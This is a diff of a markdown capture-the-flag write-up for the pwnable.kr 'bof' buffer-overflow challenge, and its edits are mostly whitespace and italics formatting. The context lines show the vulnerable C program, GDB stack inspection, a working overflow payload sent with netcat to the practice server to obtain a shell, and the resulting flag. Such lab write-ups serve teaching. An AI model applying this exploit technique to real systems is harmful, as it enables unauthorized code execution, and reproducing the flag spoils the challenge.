@@ -21,6 +21,7 @@ Running at : nc pwnable.kr 9000
 ```
 
 Let's take a look at `bof`:
+
 ```sh
 $ file bof
 bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
@@ -28,6 +29,7 @@ bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically li
 
 Running `bof` locally, we get a prompt and a hint: "overflow me". Entering a random string
 results in "Nah...".
+
 ```sh
 $ nc pwnable.kr 9000
 overflow me :
@@ -36,6 +38,7 @@ Nah..
 ```
 
 Let's take a look at the source code provided:
+
 ```c
 #include <stdio.h>
 #include <string.h>
@@ -58,7 +61,7 @@ int main(int argc, char* argv[]){
 ```
 
 This program passes `0xdeadbeef` to `func()` as `key`. A buffer is created with
-a length of 32. [`gets`] is used to read a string from *stdin* into
+a length of 32. [`gets`] is used to read a string from _stdin_ into
 `overflowme`. Finally, `key` is compared to `0xcafebabe` and if they are equal,
 we are given a shell.
 
@@ -71,11 +74,13 @@ So now we know that `gets` will happily read more bytes than the buffer will
 hold. We need to somehow overwrite `key` with the value `0xcafebabe`.
 
 Let's open the binary in [GDB]:
+
 ```sh
 gdb ./bof
 ```
 
 If we disassembly `func`, we can see the compare against `0xcafebabe` at `+40`.
+
 ```
 (gdb) disas func
 Dump of assembler code for function func:
@@ -106,6 +111,7 @@ Dump of assembler code for function func:
 ```
 
 Let's set a breakpoint there:
+
 ```
 (gdb) break *func+40
 Breakpoint 1 at 0x56555654
@@ -113,6 +119,7 @@ Breakpoint 1 at 0x56555654
 
 Let's run it. We know the buffer expects 32 bytes, so let's give it some
 sentinel values to find them on the stack.
+
 ```
 (gdb) run
 overflow me :
@@ -122,6 +129,7 @@ Breakpoint 1, 0x56555654 in func ()
 ```
 
 We hit our breakpoint. Let's examine the stack:
+
 ```
 (gdb) x/24x $esp
 0xffffd290:     0xffffd2ac      0x00000020      0x00000000      0xffffd454
@@ -158,6 +166,7 @@ Let's try our payload against the target. We need to wrap the Python program in
 a sub shell with `cat` in order to keep stdin open. Nothing will be printed at
 first, but if hit return once, we'll be in the shell and can execute `ls` to see
 what we have access to and finally `cat flag` to get the flag.
+
 ```sh
 $ (python -c "import sys; \
 payload = b'\xca\xfe\xba\xbe'[::-1]*14; \
@@ -176,6 +185,7 @@ daddy, I just pwned a buFFer :)
 
 In the future, we can use [pwntools] to make our attack easier to write and
 execute:
+
 ```py
 from pwn import *
 
